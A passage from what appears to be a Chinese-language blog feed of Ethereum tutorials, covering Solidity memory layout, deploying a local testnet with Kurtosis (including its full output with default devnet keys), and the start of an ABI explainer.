<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MemoryExample &#123;</span><br><span class="line">    function demo() public pure returns (bytes memory, string memory) &#123;</span><br><span class="line">        bytes memory byteArray = new bytes(10); // 动态字节数组</span><br><span class="line">        string memory str = &quot;Hello, Memory!&quot;;</span><br><span class="line">        return (byteArray, str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><code>byteArray</code>:<ul>
<li>主变量存储数据偏移量，例如 0x80。</li>
<li>数据存储从 0x80 开始：<ul>
<li>长度（10 字节）：存储在 0x80。</li>
<li>实际内容（10 字节）：从 0xA0 开始。</li>
</ul>
</li>
</ul>
</li>
<li><code>str</code>:<ul>
<li>主变量存储数据偏移量，例如 0xE0。</li>
<li>数据存储从 0xE0 开始：<ul>
<li>长度（14 字节）：存储在 0xE0。</li>
<li>实际内容（”Hello, Memory!”）：从 0x100 开始。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h1 id="State-Layout-和-Memory-Layout-的区别"><a href="#State-Layout-和-Memory-Layout-的区别" class="headerlink" title="State Layout 和 Memory Layout 的区别"></a>State Layout 和 Memory Layout 的区别</h1><table>
<thead>
<tr>
<th align="center">特性</th>
<th align="left">状态布局 (State Layout)</th>
<th align="left">内存布局 (Memory Layout)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">存储位置</td>
<td align="left">持久化存储在 EVM 存储 (Storage) 中</td>
<td align="left">函数调用时临时存储在 EVM 内存 (Memory) 中</td>
</tr>
<tr>
<td align="center">生命周期</td>
<td align="left">持久化，合约销毁之前一直存在</td>
<td align="left">临时，函数执行结束即释放</td>
</tr>
<tr>
<td align="center">成本</td>
<td align="left">写入存储需要高 Gas 成本</td>
<td align="left">使用内存成本较低</td>
</tr>
<tr>
<td align="center">用途</td>
<td align="left">存储合约的持久化数据</td>
<td align="left">处理临时计算或函数的中间结果</td>
</tr>
</tbody></table>
<p><strong>Gas 优化建议</strong></p>
<ul>
<li>状态变量优化<ul>
<li>紧密打包变量，减少存储槽的使用。</li>
<li>避免在循环中频繁读写存储。</li>
</ul>
</li>
<li>内存优化<ul>
<li>使用临时变量代替状态变量进行中间计算。</li>
<li>适时释放不再使用的内存。</li>
</ul>
</li>
</ul>
<p> 了解 Solidity 的状态与内存布局，能帮助开发者高效设计合约，同时优化 Gas 成本。</p>
]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>ethereum</tag>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>Kurtosis 部署 Ethereum 测试网</title>
    <url>/2024/12/11/blockchain/ethereum/kurtosis-deploy-ethereum/</url>
    <content><![CDATA[<h2 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h2><p><a href="https://docs.docker.com/manuals/">https://docs.docker.com/manuals/</a></p>
<h2 id="安装Kurtosis"><a href="#安装Kurtosis" class="headerlink" title="安装Kurtosis"></a>安装Kurtosis</h2><p>以macos为例，安装Kurtosis</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brew install kurtosis-tech/tap/kurtosis-cli</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">kurtosis version</span></span><br><span class="line">CLI Version:   1.4.3</span><br><span class="line"></span><br><span class="line">To see the engine version (provided it is running): kurtosis engine status</span><br></pre></td></tr></table></figure>

<h2 id="部署Ethereum测试网"><a href="#部署Ethereum测试网" class="headerlink" title="部署Ethereum测试网"></a>部署Ethereum测试网</h2><p>使用下面命令部署Ethereum测试网络</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">kurtosis --enclave local-eth-testnet run github.com/ethpandaops/ethereum-package</span></span><br></pre></td></tr></table></figure>

<p>以下是部署过程的输出信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">INFO[2024-12-11T15:08:23+08:00] Creating a new enclave for Starlark to run inside...</span><br><span class="line">INFO[2024-12-11T15:08:25+08:00] Enclave &#x27;local-eth-testnet&#x27; created successfully</span><br><span class="line"></span><br><span class="line">Container images used in this run:</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ethpandaops/lighthouse:stable - remotely downloaded</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ethpandaops/ethereum-genesis-generator:3.4.2 - remotely downloaded</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ethereum/client-go:latest - remotely downloaded</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">python:3.11-alpine - remotely downloaded</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">protolambda/eth2-val-tools:latest - remotely downloaded</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">badouralix/curl-jq - remotely downloaded</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">Starlark code successfully run. Output was:</span><br><span class="line">&#123;</span><br><span class="line">	&quot;all_participants&quot;: [</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;cl_context&quot;: &#123;</span><br><span class="line">				&quot;beacon_grpc_url&quot;: &quot;&quot;,</span><br><span class="line">				&quot;beacon_http_url&quot;: &quot;http://172.16.4.11:4000&quot;,</span><br><span class="line">				&quot;beacon_service_name&quot;: &quot;cl-1-lighthouse-geth&quot;,</span><br><span class="line">				&quot;cl_nodes_metrics_info&quot;: [</span><br><span class="line">					&#123;</span><br><span class="line">						&quot;config&quot;: &#123;</span><br><span class="line">							&quot;labels&quot;: null,</span><br><span class="line">							&quot;scrape_interval&quot;: &quot;15s&quot;</span><br><span class="line">						&#125;,</span><br><span class="line">						&quot;name&quot;: &quot;cl-1-lighthouse-geth&quot;,</span><br><span class="line">						&quot;path&quot;: &quot;/metrics&quot;,</span><br><span class="line">						&quot;url&quot;: &quot;172.16.4.11:5054&quot;</span><br><span class="line">					&#125;</span><br><span class="line">				],</span><br><span class="line">				&quot;client_name&quot;: &quot;lighthouse&quot;,</span><br><span class="line">				&quot;enr&quot;: &quot;enr:-Mm4QGoJFz_8BxhUo1_qcU99AlMtQg08SE_lrbH0B3cVOdoiFyHNA12IrI2DwAsZG7AvSeocDB9TcFad33Om5sd9Gc0Dh2F0dG5ldHOIAAAAAMAAAACDY3NjBIRldGgykE-3JeFgAAA4AOH1BQAAAACCaWSCdjSCaXCErBAEC4RxdWljgiMpiXNlY3AyNTZrMaEDwNCUN06NbFU4oqKnXHkTMdcdNTlr_xwC33QSFfCdcL6Ic3luY25ldHMAg3RjcIIjKIN1ZHCCIyg&quot;,</span><br><span class="line">				&quot;http_port&quot;: 4000,</span><br><span class="line">				&quot;ip_addr&quot;: &quot;172.16.4.11&quot;,</span><br><span class="line">				&quot;multiaddr&quot;: &quot;/ip4/172.16.4.11/tcp/9000/p2p/16Uiu2HAmRdf6aDAhx764sqQkD9BYQxFmyAXoCaGETKCwb49MTLgm&quot;,</span><br><span class="line">				&quot;peer_id&quot;: &quot;16Uiu2HAmRdf6aDAhx764sqQkD9BYQxFmyAXoCaGETKCwb49MTLgm&quot;,</span><br><span class="line">				&quot;snooper_enabled&quot;: false,</span><br><span class="line">				&quot;snooper_engine_context&quot;: null,</span><br><span class="line">				&quot;supernode&quot;: false,</span><br><span class="line">				&quot;validator_keystore_files_artifact_uuid&quot;: &quot;1-lighthouse-geth-0-63&quot;</span><br><span class="line">			&#125;,</span><br><span class="line">			&quot;cl_type&quot;: &quot;lighthouse&quot;,</span><br><span class="line">			&quot;el_context&quot;: &#123;</span><br><span class="line">				&quot;client_name&quot;: &quot;geth&quot;,</span><br><span class="line">				&quot;el_metrics_info&quot;: [</span><br><span class="line">					&#123;</span><br><span class="line">						&quot;config&quot;: &#123;</span><br><span class="line">							&quot;labels&quot;: null,</span><br><span class="line">							&quot;scrape_interval&quot;: &quot;15s&quot;</span><br><span class="line">						&#125;,</span><br><span class="line">						&quot;name&quot;: &quot;el-1-geth-lighthouse&quot;,</span><br><span class="line">						&quot;path&quot;: &quot;/debug/metrics/prometheus&quot;,</span><br><span class="line">						&quot;url&quot;: &quot;172.16.4.10:9001&quot;</span><br><span class="line">					&#125;</span><br><span class="line">				],</span><br><span class="line">				&quot;engine_rpc_port_num&quot;: 8551,</span><br><span class="line">				&quot;enode&quot;: &quot;enode://e273007e4a0cc96fb52d02e132643dcdc7dabee68bdf65e7a538f01e33682ae137c0f25ca51301f99e9ac2ba2ca625af9caa6c692246597872f9d0bac4d6c3ab@172.16.4.10:30303&quot;,</span><br><span class="line">				&quot;enr&quot;: &quot;enr:-Ki4QEtrZL_kOZOzlrm5bzYHqXuAExc82OpFTVlzlWpvfkbAThI2xjDaR44kByHuwzs0Lg4QpasiuBLWFzvq0Tuk7cuGAZO0jpf1g2V0aMzLhKMFvEuFCVgqux6CaWSCdjSCaXCErBAEColzZWNwMjU2azGhA-JzAH5KDMlvtS0C4TJkPc3H2r7mi99l56U48B4zaCrhhHNuYXDAg3RjcIJ2X4N1ZHCCdl8&quot;,</span><br><span class="line">				&quot;ip_addr&quot;: &quot;172.16.4.10&quot;,</span><br><span class="line">				&quot;rpc_http_url&quot;: &quot;http://172.16.4.10:8545&quot;,</span><br><span class="line">				&quot;rpc_port_num&quot;: 8545,</span><br><span class="line">				&quot;service_name&quot;: &quot;el-1-geth-lighthouse&quot;,</span><br><span class="line">				&quot;ws_port_num&quot;: 8546,</span><br><span class="line">				&quot;ws_url&quot;: &quot;ws://172.16.4.10:8546&quot;</span><br><span class="line">			&#125;,</span><br><span class="line">			&quot;el_type&quot;: &quot;geth&quot;,</span><br><span class="line">			&quot;ethereum_metrics_exporter_context&quot;: null,</span><br><span class="line">			&quot;remote_signer_context&quot;: null,</span><br><span class="line">			&quot;remote_signer_type&quot;: &quot;web3signer&quot;,</span><br><span class="line">			&quot;snooper_beacon_context&quot;: null,</span><br><span class="line">			&quot;snooper_engine_context&quot;: null,</span><br><span class="line">			&quot;vc_context&quot;: &#123;</span><br><span class="line">				&quot;client_name&quot;: &quot;lighthouse&quot;,</span><br><span class="line">				&quot;metrics_info&quot;: &#123;</span><br><span class="line">					&quot;config&quot;: &#123;</span><br><span class="line">						&quot;labels&quot;: null,</span><br><span class="line">						&quot;scrape_interval&quot;: &quot;15s&quot;</span><br><span class="line">					&#125;,</span><br><span class="line">					&quot;name&quot;: &quot;vc-1-geth-lighthouse&quot;,</span><br><span class="line">					&quot;path&quot;: &quot;/metrics&quot;,</span><br><span class="line">					&quot;url&quot;: &quot;172.16.4.12:8080&quot;</span><br><span class="line">				&#125;,</span><br><span class="line">				&quot;service_name&quot;: &quot;vc-1-geth-lighthouse&quot;</span><br><span class="line">			&#125;,</span><br><span class="line">			&quot;vc_type&quot;: &quot;lighthouse&quot;,</span><br><span class="line">			&quot;xatu_sentry_context&quot;: null</span><br><span class="line">		&#125;</span><br><span class="line">	],</span><br><span class="line">	&quot;final_genesis_timestamp&quot;: &quot;1733901086&quot;,</span><br><span class="line">	&quot;genesis_validators_root&quot;: &quot;0xd61ea484febacfae5298d52a2b581f3e305a51f3112a9241b968dccf019f7b11&quot;,</span><br><span class="line">	&quot;network_id&quot;: &quot;3151908&quot;,</span><br><span class="line">	&quot;network_params&quot;: &#123;</span><br><span class="line">		&quot;additional_preloaded_contracts&quot;: &#123;&#125;,</span><br><span class="line">		&quot;altair_fork_epoch&quot;: 0,</span><br><span class="line">		&quot;bellatrix_fork_epoch&quot;: 0,</span><br><span class="line">		&quot;capella_fork_epoch&quot;: 0,</span><br><span class="line">		&quot;churn_limit_quotient&quot;: 65536,</span><br><span class="line">		&quot;custody_requirement&quot;: 4,</span><br><span class="line">		&quot;data_column_sidecar_subnet_count&quot;: 128,</span><br><span class="line">		&quot;deneb_fork_epoch&quot;: 0,</span><br><span class="line">		&quot;deposit_contract_address&quot;: &quot;0x4242424242424242424242424242424242424242&quot;,</span><br><span class="line">		&quot;devnet_repo&quot;: &quot;ethpandaops&quot;,</span><br><span class="line">		&quot;eip7594_fork_epoch&quot;: 100000002,</span><br><span class="line">		&quot;eip7594_fork_version&quot;: &quot;0x60000038&quot;,</span><br><span class="line">		&quot;ejection_balance&quot;: 16000000000,</span><br><span class="line">		&quot;electra_fork_epoch&quot;: 100000000,</span><br><span class="line">		&quot;eth1_follow_distance&quot;: 2048,</span><br><span class="line">		&quot;fulu_fork_epoch&quot;: 100000001,</span><br><span class="line">		&quot;genesis_delay&quot;: 20,</span><br><span class="line">		&quot;genesis_gaslimit&quot;: 30000000,</span><br><span class="line">		&quot;max_blobs_per_block&quot;: 6,</span><br><span class="line">		&quot;max_per_epoch_activation_churn_limit&quot;: 8,</span><br><span class="line">		&quot;min_validator_withdrawability_delay&quot;: 256,</span><br><span class="line">		&quot;network&quot;: &quot;kurtosis&quot;,</span><br><span class="line">		&quot;network_id&quot;: &quot;3151908&quot;,</span><br><span class="line">		&quot;network_sync_base_url&quot;: &quot;https://snapshots.ethpandaops.io/&quot;,</span><br><span class="line">		&quot;num_validator_keys_per_node&quot;: 64,</span><br><span class="line">		&quot;prefunded_accounts&quot;: &#123;&#125;,</span><br><span class="line">		&quot;preregistered_validator_count&quot;: 0,</span><br><span class="line">		&quot;preregistered_validator_keys_mnemonic&quot;: &quot;giant issue aisle success illegal bike spike question tent bar rely arctic volcano long crawl hungry vocal artwork sniff fantasy very lucky have athlete&quot;,</span><br><span class="line">		&quot;preset&quot;: &quot;mainnet&quot;,</span><br><span class="line">		&quot;samples_per_slot&quot;: 8,</span><br><span class="line">		&quot;seconds_per_slot&quot;: 12,</span><br><span class="line">		&quot;shard_committee_period&quot;: 256</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;pre_funded_accounts&quot;: [</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0x8943545177806ED17B9F23F0a21ee5948eCaa776&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;bcdf20249abf0ed6d944c0288fad489e33f66b3960d9e6229c1cd214ed3bbe31&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0xE25583099BA105D9ec0A67f5Ae86D90e50036425&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;39725efee3fb28614de3bacaffe4cc4bd8c436257e2c8bb887c4b5c4be45e76d&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0x614561D2d143621E126e87831AEF287678B442b8&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;53321db7c1e331d93a11a41d16f004d7ff63972ec8ec7c25db329728ceeb1710&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0xf93Ee4Cf8c6c40b329b0c0626F28333c132CF241&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;ab63b23eb7941c1251757e24b3d2350d2bc05c3c388d06f8fe6feafefb1e8c70&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0x802dCbE1B1A97554B4F50DB5119E37E8e7336417&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;5d2344259f42259f82d2c140aa66102ba89b57b4883ee441a8b312622bd42491&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0xAe95d8DA9244C37CaC0a3e16BA966a8e852Bb6D6&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;27515f805127bebad2fb9b183508bdacb8c763da16f54e0678b16e8f28ef3fff&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0x2c57d1CFC6d5f8E4182a56b4cf75421472eBAEa4&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;7ff1a4c1d57e5e784d327c4c7651e952350bc271f156afb3d00d20f5ef924856&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0x741bFE4802cE1C4b5b00F9Df2F5f179A1C89171A&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;3a91003acaf4c21b3953d94fa4a6db694fa69e5242b2e37be05dd82761058899&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0xc3913d4D8bAb4914328651C2EAE817C8b78E1f4c&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;bb1d0f125b4fb2bb173c318cdead45468474ca71474e2247776b2b4c0fa2d3f5&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0x65D08a056c17Ae13370565B04cF77D2AfA1cB9FA&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;850643a0224065ecce3882673c21f56bcf6eef86274cc21cadff15930b59fc8c&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0x3e95dFbBaF6B348396E6674C7871546dCC568e56&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;94eb3102993b41ec55c241060f47daa0f6372e2e3ad7e91612ae36c364042e44&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0x5918b2e647464d4743601a865753e64C8059Dc4F&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;daf15504c22a352648a71ef2926334fe040ac1d5005019e09f6c979808024dc7&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0x589A698b7b7dA0Bec545177D3963A2741105C7C9&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;eaba42282ad33c8ef2524f07277c03a776d98ae19f581990ce75becb7cfa1c23&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0x4d1CB4eB7969f8806E2CaAc0cbbB71f88C8ec413&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;3fd98b5187bf6526734efaa644ffbb4e3670d66f5d0268ce0323ec09124bff61&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0xF5504cE2BcC52614F121aff9b93b2001d92715CA&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;5288e2f440c7f0cb61a9be8afdeb4295f786383f96f5e35eb0c94ef103996b64&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0xF61E98E7D47aB884C244E39E031978E33162ff4b&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;f296c7802555da2a5a662be70e078cbd38b44f96f8615ae529da41122ce8db05&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0xf1424826861ffbbD25405F5145B5E50d0F1bFc90&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;bf3beef3bd999ba9f2451e06936f0423cd62b815c9233dd3bc90f7e02a1e8673&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0xfDCe42116f541fc8f7b0776e2B30832bD5621C85&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;6ecadc396415970e91293726c3f5775225440ea0844ae5616135fd10d66b5954&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0xD9211042f35968820A3407ac3d80C725f8F75c14&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;a492823c3e193d6c595f37a18e3c06650cf4c74558cc818b16130b293716106f&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0xD8F3183DEF51A987222D845be228e0Bbb932C222&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;c5114526e042343c6d1899cad05e1c00ba588314de9b96929914ee0df18d46b2&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;address&quot;: &quot;0xafF0CA253b97e54440965855cec0A8a2E2399896&quot;,</span><br><span class="line">			&quot;private_key&quot;: &quot;4b9f63ecf84210c5366c66d68fa1f5da1fa4f634fad6dfc86178e4d79ff9e59&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">⭐ us on GitHub - https://github.com/kurtosis-tech/kurtosis</span><br><span class="line">INFO[2024-12-11T15:11:10+08:00] ==========================================================</span><br><span class="line">INFO[2024-12-11T15:11:10+08:00] ||          Created enclave: local-eth-testnet          ||</span><br><span class="line">INFO[2024-12-11T15:11:10+08:00] ==========================================================</span><br><span class="line">Name:            local-eth-testnet</span><br><span class="line">UUID:            b134e2cd4ffa</span><br><span class="line">Status:          RUNNING</span><br><span class="line">Creation Time:   Wed, 11 Dec 2024 15:08:23 CST</span><br><span class="line">Flags:</span><br><span class="line"></span><br><span class="line">========================================= Files Artifacts =========================================</span><br><span class="line">UUID           Name</span><br><span class="line">eeac0b67fe11   1-lighthouse-geth-0-63</span><br><span class="line">0ca90fbaddae   el_cl_genesis_data</span><br><span class="line">02724177f009   final-genesis-timestamp</span><br><span class="line">6579d6313c44   genesis-el-cl-env-file</span><br><span class="line">6236b016ccf1   genesis_validators_root</span><br><span class="line">d65d356d27a3   jwt_file</span><br><span class="line">77d5e8aa3bf1   keymanager_file</span><br><span class="line">f873ac882893   prysm-password</span><br><span class="line">7f0f603a0154   validator-ranges</span><br><span class="line"></span><br><span class="line">========================================== User Services ==========================================</span><br><span class="line">UUID           Name                                             Ports                                         Status</span><br><span class="line">38a34f4ff219   cl-1-lighthouse-geth                             http: 4000/tcp -&gt; http://127.0.0.1:54095      RUNNING</span><br><span class="line">                                                                metrics: 5054/tcp -&gt; http://127.0.0.1:54096</span><br><span class="line">                                                                tcp-discovery: 9000/tcp -&gt; 127.0.0.1:54097</span><br><span class="line">                                                                udp-discovery: 9000/udp -&gt; 127.0.0.1:60155</span><br><span class="line">714c863fd14f   el-1-geth-lighthouse                             engine-rpc: 8551/tcp -&gt; 127.0.0.1:54056       RUNNING</span><br><span class="line">                                                                metrics: 9001/tcp -&gt; http://127.0.0.1:54057</span><br><span class="line">                                                                rpc: 8545/tcp -&gt; 127.0.0.1:54059</span><br><span class="line">                                                                tcp-discovery: 30303/tcp -&gt; 127.0.0.1:54058</span><br><span class="line">                                                                udp-discovery: 30303/udp -&gt; 127.0.0.1:54093</span><br><span class="line">                                                                ws: 8546/tcp -&gt; 127.0.0.1:54055</span><br><span class="line">ef18a854d243   validator-key-generation-cl-validator-keystore   &lt;none&gt;                                        RUNNING</span><br><span class="line">0f4da064ec7f   vc-1-geth-lighthouse                             metrics: 8080/tcp -&gt; http://127.0.0.1:54168   RUNNING</span><br></pre></td></tr></table></figure>

<ul>
<li>cl-1-lighthouse-geth<br>  以太坊 2.0 的 Beacon Chain 节点（共识层）。负责管理 PoS 共识机制、验证区块、协调验证者任务、维护 Beacon Chain 状态。</li>
<li>el-1-geth-lighthouse<br>  以太坊 1.x 的执行层客户端。它负责处理智能合约、账户状态更新、交易验证等功能。它的主要职责是提供执行层的支持，与以太坊 2.0 的共识层（如 Lighthouse）协作。</li>
<li>validator-key-generation-cl-validator-keystore<br>  以太坊 2.0（即 Ethereum 2.0 或 Eth2）验证者（validator）管理的工具集。这个工具集为以太坊 2.0 的验证者提供了多种支持功能，帮助他们更加高效、安全地参与以太坊的 权益证明（Proof of Stake, PoS） 共识机制。通过这些工具，验证者可以生成必要的密钥、管理其验证者身份、监控验证者的状态以及优化验证过程。</li>
<li>vc-1-geth-lighthouse<br>  验证者客户端（Validator Client）。验证者客户端专门管理验证者账户、执行验证签名职责。</li>
</ul>
<h2 id="操作ethereum"><a href="#操作ethereum" class="headerlink" title="操作ethereum"></a>操作ethereum</h2><p>使用命令<code>kurtosis service shell local-eth-testnet el-1-geth-lighthouse</code>登录<code>el-1-geth-lighthouse</code>的容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">kurtosis service shell local-eth-testnet el-1-geth-lighthouse</span></span><br><span class="line">No bash found on container; dropping down to sh shell...</span><br><span class="line">/ #</span><br></pre></td></tr></table></figure>

<p>然后就可以使用<code>geth</code>这个命令了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/ # geth --datadir /data/geth/execution-data/ attach</span><br><span class="line">Welcome to the Geth JavaScript console!</span><br><span class="line"></span><br><span class="line">instance: Geth/v1.14.13-unstable-330190e4-20241210/linux-arm64/go1.23.4</span><br><span class="line">at block: 1293 (Thu Dec 12 2024 02:22:26 GMT+0000 (UTC))</span><br><span class="line"> datadir: /data/geth/execution-data</span><br><span class="line"> modules: admin:1.0 debug:1.0 engine:1.0 eth:1.0 miner:1.0 net:1.0 rpc:1.0 txpool:1.0 web3:1.0</span><br><span class="line"></span><br><span class="line">To exit, press ctrl-d or type exit</span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br></pre></td></tr></table></figure>

<p>接下来就可以输入JS代码</p>
<h2 id="Metamask添加网络"><a href="#Metamask添加网络" class="headerlink" title="Metamask添加网络"></a>Metamask添加网络</h2><p><img src="/images/blockchain/ethereum/kurtosis_metamask_add_network.jpg" alt="kurtosis_metamask_add_network"></p>
<p>根据Kurtosis部署过程中输出的信息添加Metamask网络</p>
]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>ethereum</tag>
        <tag>kurtosis</tag>
      </tags>
  </entry>
  <entry>
    <title>ABI格式和使用</title>
    <url>/2024/12/13/blockchain/ethereum/abi-principle-apply/</url>
    <content><![CDATA[<h2 id="什么是-ABI-Application-Binary-Interface"><a href="#什么是-ABI-Application-Binary-Interface" class="headerlink" title="什么是 ABI (Application Binary Interface)?"></a>什么是 ABI (Application Binary Interface)?</h2><p>在 Solidity 中，ABI（应用二进制接口）是智能合约与外界（包括其他合约和用户界面）交互的桥梁。它定义了智能合约中函数的编码方式、输入参数和返回值的格式，以便在区块链中进行数据的传输和解析。</p>
<h3 id="ABI-的作用"><a href="#ABI-的作用" class="headerlink" title="ABI 的作用"></a>ABI 的作用</h3><ol>
<li><strong>数据编码与解码</strong>：在区块链中，所有的数据都以二进制形式存储和传输。ABI 提供了标准化的编码规则，使得智能合约的函数调用可以正确地解释输入和输出数据。</li>
<li><strong>合约交互</strong>：外部程序（如 DApp）需要 ABI 文件来与合约交互，了解合约的函数和参数。</li>
<li><strong>兼容性</strong>：通过 ABI，智能合约之间可以互操作，即使它们是由不同的开发人员编写的。</li>
</ol>
<h3 id="ABI-的重要性"><a href="#ABI-的重要性" class="headerlink" title="ABI 的重要性"></a>ABI 的重要性</h3><ul>
<li><strong>统一性</strong>：ABI 使得智能合约与外部交互的过程标准化，避免了自定义协议带来的复杂性。</li>
<li><strong>跨语言支持</strong>：无论是前端、后端，还是区块链中的其他合约，都可以基于 ABI 与合约进行交互。</li>
</ul>
<h2 id="ABI的原理"><a href="#ABI的原理" class="headerlink" title="ABI的原理"></a>ABI的原理</h2><h3 id="ABI-的结构"><a href="#ABI-的结构" class="headerlink" title="ABI 的结构"></a>ABI 的结构</h3><p>ABI 通常是以 JSON 格式生成的文件，描述了智能合约的函数、事件及其参数。</p>
<p><strong>示例合约</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Example &#123;</span><br><span class="line">    uint256 public value;</span><br><span class="line"></span><br><span class="line">    event ValueChanged(uint256 newValue);</span><br><span class="line"></span><br><span class="line">    function setValue(uint256 _value) public &#123;</span><br><span class="line">        value = _value;</span><br><span class="line">        emit ValueChanged(_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getValue() public view returns (uint256) &#123;</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ABI 的 JSON 表示</strong></p>
<p>运行 <code>solc --abi Example.sol</code> 会生成以下 ABI 文件：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;anonymous&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;inputs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;indexed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;internalType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;uint256&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newValue&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;uint256&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ValueChanged&quot;</span><span 